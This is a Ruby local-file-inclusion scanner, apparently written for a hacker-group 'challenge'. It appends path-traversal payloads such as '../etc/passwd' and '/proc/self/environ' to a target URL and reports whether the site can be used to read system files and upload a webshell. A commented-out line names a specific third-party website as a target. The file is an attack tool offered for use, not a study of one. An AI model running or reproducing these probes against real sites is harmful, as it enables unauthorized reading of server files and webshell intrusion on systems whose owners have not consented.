require 'colorize'
require 'open-uri'


class Design

	def Ascii
		puts "-----------------------------------------------------------------------------".red
		kaka = open("http://artii.herokuapp.com/make?text=LFI_SCANNER&font=bubble_b").read


	end

	def Copyright
		puts "-----------------------------------------------------------------------------".red
		puts "\t\tScript Dev By Muham'RB for Challenge Vs Kezua".yellow
		kezua = "Kezua | Myanity".blue
		muham = "Muham | Society Squad".red

		puts "\t\t#{kezua} VS #{muham}"
		puts "-----------------------------------------------------------------------------".red



	end





end


class Scanner

	attr_accessor :link

	def initialize(uri)
		@link = uri


	end

	def ScannerLFI

		r = open("#{link}/etc/passwd").read

		if r.include? "root:x:0:0:root:"
			puts "#{link}/etc/passwd --> are vulnerable to this path".green
			puts "Scanne to know upload webshell".blue
			puts "Testing with new path --> /proc/self/environ".yellow
			puts "#{link}/proc/self/environ".yellow
			scannshell = open("#{link}/proc/self/environ").read
			if scannshell.include? "CONTEXT_DOCUMENT_ROOT="
				puts "#{link}/proc/self/environ --> is vulnerable to upload webshell with burpsuite. Thanks for has use my script".green 

			else
				puts "Testing with new path --> ../proc/self/environ".yellow
				puts "#{link}../proc/self/environ".yellow
				scndscan = open("#{link}../proc/self/environ").read

				if scndscan.include? "CONTEXT_DOCUMENT_ROOT"
					puts "#{link}../proc/self/environ --> is vulnerable to upload webshell with burpsuite. Thanks for has use my script".green


				else
					puts "Testing new path payload --> ../../proc/self/environ".yellow
					puts "#{link}../../proc/self/environ".yellow

					thirdscan = open("#{link}../../proc/self/environ").read

					if thirdscan.include? "CONTEXT_DOCUMENT_ROOT"
						puts "#{link}../../proc/self/environ --> is vulnerable to upload webshell with burpsuite. Thanks for has use my script".green


					else
						puts "#{link} is not vulnerable to uploader shell".red


					end

				end

			end

		else
			puts "#{link}/etc/passwd --> are don't vulnerable to this path".red
			puts "Second Payload --> ../etc/passwd".blue

			rscnd = open("#{link}../etc/passwd").read

			if rscnd.include? "root:x:0:0:root:"
				puts "#{link}../etc/passwd --> are vulnerable to this path".green
				puts "Scanne to know upload webshell".blue
				puts "Testing with new path --> /proc/self/environ".yellow
				puts "#{link}/proc/self/environ".yellow

				scann = open("#{link}/proc/self/environ").read

				if scann.include? "CONTEXT_DOCUMENT_ROOT"
					puts "#{link}/proc/self/environ --> is vulnerable to upload webshell with burpsuite. Thanks for has use my script".green 


				else
					puts "Testing with new path --> ../proc/self/environ".yellow
					puts "#{link}../proc/self/environ".yellow
					scannD = open("#{link}../proc/self/environ").read

					if scannD.include? "CONTEXT_DOCUMENT_ROOT"
						puts "#{link}../proc/self/environ --> is vulnerable to upload webshell with burpsuite. Thanks for has use my script".green 


					else
						puts "Testing with new path --> ../../proc/self/environ".yellow
						puts "#{link}../../proc/self/environ".yellow
						scannJ = open("#{link}../../proc/self/environ").read

						if scannJ.include? "CONTEXT_DOCUMENT_ROOT"
							puts "#{link}../../proc/self/environ --> is vulnerable to upload webshell with burpsuite. Thanks for has use my script".green




						else
							puts "#{link} is not vulnerable to uploader shell".red




						end



					end




				end




			else
				puts "#{link}../etc/passwd --> are don't vulnerable to this path".red
				puts "Third Payload --> ../../etc/passwd".blue

				rthre = open("#{link}../../etc/passwd").read
				if rthre.include? "root:x:0:0:root:"
					puts "#{link}../../etc/passwd --> are vulnerable to this path".green
					puts "Scanne to know upload webshell".blue
					puts "Testing with new path --> /proc/self/environ".yellow
					puts "#{link}/proc/self/environ".yellow

					sc = open("#{link}/proc/self/environ").read

					if sc.include? "CONTEXT_DOCUMENT_ROOT"
						puts "#{link}/proc/self/environ --> is vulnerable to upload webshell with burpsuite. Thanks for has use my script".green



					else
						puts "Testing with new path --> ../proc/self/environ".yellow
						puts "#{link}../proc/self/environ".yellow
						scannK = open("#{link}../proc/self/environ").read

						if scannK.include? "CONTEXT_DOCUMENT_ROOT"
							puts "#{link}../proc/self/environ --> is vulnerable to upload webshell with burpsuite. Thanks for has use my script".green





						else
							puts "Testing with new path --> ../../proc/self/environ".yellow
							puts "#{link}../../proc/self/environ".yellow
							scannKo = open("#{link}../../proc/self/environ").read

							if scannKo.include? "CONTEXT_DOCUMENT_ROOT"
								puts "#{link}../../proc/self/environ --> is vulnerable to upload webshell with burpsuite. Thanks for has use my script".green



							else
								puts "#{link} is not vulnerable to uploader shell".red



							end



						end




					end

				else
					puts "#{link}../../etc/passwd --> are don't vulnerable to this path".red
				

				end



			end

		end

	end



end

design = Design.new
puts design.Ascii.yellow
puts design.Copyright

if ARGV.length == 2
	if ARGV[0] == "-l"
		scanner = Scanner.new(ARGV[1])
		scanner.ScannerLFI


	else
		puts "COMMAND: LFIScanner.rb -l <link of website>".blue

	end


else
	puts "COMMAND: LFIScanner.rb -l <link of website>".blue

end
#scanner = Scanner.new("http://www.thagafaqurania.net/modules/My_eGallery/public/displayCategory.php?basepath=")
#scanner.ScannerLFI